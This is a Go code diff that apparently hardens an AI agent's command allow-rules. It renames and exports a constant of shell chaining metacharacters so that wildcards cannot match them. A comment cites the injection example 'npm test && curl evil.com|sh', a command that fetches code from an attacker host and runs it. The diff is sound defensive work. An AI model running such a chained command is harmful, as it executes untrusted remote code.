@@ -242,16 +242,19 @@ func globToRegexp(glob string) *regexp.Regexp {
 	return re
 }
 
-// shellMetaClass is the character class excluded from "*"/"?" expansion by
-// globToRegexpExec (P7.3): these are the shell characters that chain,
+// ShellChainMetaChars is the character class excluded from "*"/"?" expansion
+// by globToRegexpExec (P7.3): these are the shell characters that chain,
 // pipe, substitute, or redirect, so letting a wildcard span them lets a
-// scoped allow rule be widened by appending extra commands.
-const shellMetaClass = `;&|` + "`" + `$()<>` + "\n\r"
+// scoped allow rule be widened by appending extra commands. Exported so
+// other packages that need to recognize the same class of shell-injection
+// risk (the TUI's allow-always rule suggestion, the read-only shell
+// classifier — P25.4) share one definition instead of drifting apart.
+const ShellChainMetaChars = `;&|` + "`" + `$()<>` + "\n\r"
 
 // globToRegexpExec is globToRegexp's counterpart for allow-rules scoping an
 // execute-capability tool. Unlike globToRegexp's "*" → ".*" (which spans
 // everything, including shell chaining metacharacters), "*"/"?" here cannot
-// match any character in shellMetaClass. This closes the gap where
+// match any character in ShellChainMetaChars. This closes the gap where
 // "allow bash(npm test*)" — compiled the ordinary way to "^npm test.*$" —
 // also matches "npm test && curl evil.com|sh", giving a rule meant to narrow
 // auto-approval to one command no real boundary against shell injection.
@@ -263,9 +266,9 @@ func globToRegexpExec(glob string) *regexp.Regexp {
 	for _, r := range glob {
 		switch r {
 		case '*':
-			b.WriteString("[^" + shellMetaClass + "]*")
+			b.WriteString("[^" + ShellChainMetaChars + "]*")
 		case '?':
-			b.WriteString("[^" + shellMetaClass + "]")
+			b.WriteString("[^" + ShellChainMetaChars + "]")
 		default:
 			b.WriteString(regexp.QuoteMeta(string(r)))
 		}
